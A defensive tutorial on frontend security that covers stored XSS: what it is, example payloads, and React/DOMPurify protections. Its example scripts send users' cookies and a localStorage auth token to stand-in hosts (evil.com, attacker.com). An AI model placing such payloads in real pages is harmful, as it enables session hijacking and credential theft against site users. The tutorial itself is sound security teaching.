# Frontend Security Attacks — Complete Guide

> Every attack type, every subtype, how it works, real exploit examples, and exactly how to protect against it.

---

# ATTACK 1 — XSS (Cross-Site Scripting)

## What is it?
Attacker injects malicious JavaScript into your web page that runs in other users' browsers.  
The browser has no idea the script is malicious — it executes it with full trust.

**Goal of attacker:** Steal cookies/tokens, hijack sessions, redirect users, deface UI, keylog passwords.

---

## Type 1.1 — Stored XSS (Persistent XSS)

### How it works
Malicious script is **saved to the database** and served to every user who views that content.

```
Attacker submits a comment:
"Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"

→ Stored in DB
→ Every user who views the comments page executes this script
→ Their cookies are sent to evil.com
→ Attacker hijacks their sessions
```

### Real exploit
```html
<!-- Attacker posts this as a product review -->
<script>
  const token = localStorage.getItem('authToken');
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ token, url: window.location.href })
  });
</script>
```

### Protection
```jsx
// ✅ React JSX auto-escapes — use it always
<p>{comment.text}</p>
// Renders: <p>&lt;script&gt;...&lt;/script&gt;</p>  ← harmless text

// ✅ If you must render HTML — sanitize first
import DOMPurify from 'dompurify';

function Comment({ text }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(text, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
          ALLOWED_ATTR: []
        })
      }}
    />
  );
}

// Backend — sanitize BEFORE storing in DB
const createDOMPurify = require('isomorphic-dompurify');
const clean = createDOMPurify.sanitize(req.body.comment);
await db.query('INSERT INTO comments (text) VALUES ($1)', [clean]);
```

